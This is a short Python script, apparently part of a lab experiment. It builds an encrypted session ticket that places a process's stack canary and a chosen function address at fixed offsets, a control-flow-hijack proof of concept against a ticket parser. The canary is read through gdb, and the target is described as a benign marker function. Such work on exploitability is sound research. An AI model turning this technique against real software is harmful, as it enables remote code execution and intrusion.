#!/usr/bin/env python3
"""Wire-only control arm: ticket carries the process's live canary at plaintext
offset 152 and a lab-chosen benign function address at offset 184.

Canary and marker address are read (not written) from the same gdb-stopped
process by r4l-marker.cmd, then supplied through the environment to this
builder.  No process memory or register is modified.
"""
import os
import struct
import sys

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

import peer

CANARY = int(os.environ["R4L_CANARY"], 16)
MARKER = int(os.environ["R4L_MARKER"], 16)


def marker_ticket(mode, iv):
    plain = bytearray(b"F" * 208)
    plain[152:160] = struct.pack("<Q", CANARY)
    plain[184:192] = struct.pack("<Q", MARKER)
    cipher = AESGCM(peer.KEY).encrypt(iv, bytes(plain), peer.A_ID)[:208]
    return (struct.pack("!HH", 2, peer.LENGTH) + peer.A_ID + iv +
            b"\x00" * 16 + cipher)


peer.ticket = marker_ticket
sys.exit(peer.main())
